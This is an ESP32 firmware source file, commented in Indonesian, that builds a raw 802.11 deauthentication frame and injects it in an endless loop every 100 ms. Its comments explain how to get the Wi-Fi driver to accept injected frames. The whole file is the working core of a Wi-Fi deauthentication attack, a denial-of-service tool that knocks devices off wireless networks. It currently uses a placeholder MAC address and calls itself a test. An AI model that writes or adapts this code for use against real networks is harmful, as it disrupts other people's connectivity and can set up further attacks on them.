#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_event.h"

static const char *TAG = "RootX_Deauth_Test";

// Template paket Deauth (0xC0)
// Dest: FF:FF:FF:FF:FF:FF (Broadcast)
// Source: DE:AD:BE:EF:69:69 (Mac Palsu)
// BSSID: DE:AD:BE:EF:69:69
uint8_t deauth_packet[] = {
    0xc0, 0x00,                         // Type: Deauth
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Receiver (Broadcast)
    0xde, 0xad, 0xbe, 0xef, 0x69, 0x69, // Transmitter
    0xde, 0xad, 0xbe, 0xef, 0x69, 0x69, // BSSID
    0x00, 0x00,                         // Seq Number
    0x07, 0x00                          // Reason: Class 3 frame from nonassociated STA
};

void app_main(void) {
    // 1. Inisialisasi Storage & Network
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    // 2. Setup WiFi Mode Masokis (Promiscuous)
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    
    // PENTING: Pake mode AP biar driver lebih "longgar" nerima paket inject
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); 
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Hardware S3 N16R8 Ready. Starting Injection Test...");

    int pkt_count = 0;
    while (1) {
        // Tembak paket lewat interface AP
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        
        if (err == ESP_OK) {
            pkt_count++;
            if (pkt_count % 10 == 0) {
                ESP_LOGI(TAG, "Berhasil Inject %d paket Deauth (0xC0)!", pkt_count);
            }
        } else {
            // Kalau muncul error di sini, berarti driver masih nge-block
            ESP_LOGE(TAG, "GAGAL Inject! Error code: 0x%x", err);
            if (err == 0x103) ESP_LOGE(TAG, "Error 0x103 = ESP_ERR_WIFI_IF (Interface Masalah)");
        }

        vTaskDelay(pdMS_TO_TICKS(100)); // Nembak tiap 100ms
    }
}
